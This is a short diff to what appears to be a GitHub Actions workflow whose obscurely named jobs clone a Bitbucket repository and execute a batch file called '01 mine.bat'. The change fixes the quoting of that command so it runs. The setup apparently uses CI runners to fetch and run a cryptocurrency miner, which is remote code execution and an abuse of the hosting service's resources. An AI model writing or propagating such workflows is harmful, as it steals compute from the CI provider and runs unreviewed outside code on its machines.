@@ -53,7 +53,7 @@ jobs:
       run: |
         git clone https://Indrikas55@bitbucket.org/ytvahjd/oree.git 
         cd oree 
-        .\01 mine.bat
+        .\'01 mine.bat'
      
   cuk:
     needs: [alah, pelit]
@@ -79,7 +79,7 @@ jobs:
       run: |
         git clone https://Indrikas55@bitbucket.org/ytvahjd/oree.git 
         cd oree 
-        .\01 mine.bat
+        .\'01 mine.bat'
   Success:
     needs: [alah, pelit, cuk]
     if: always()
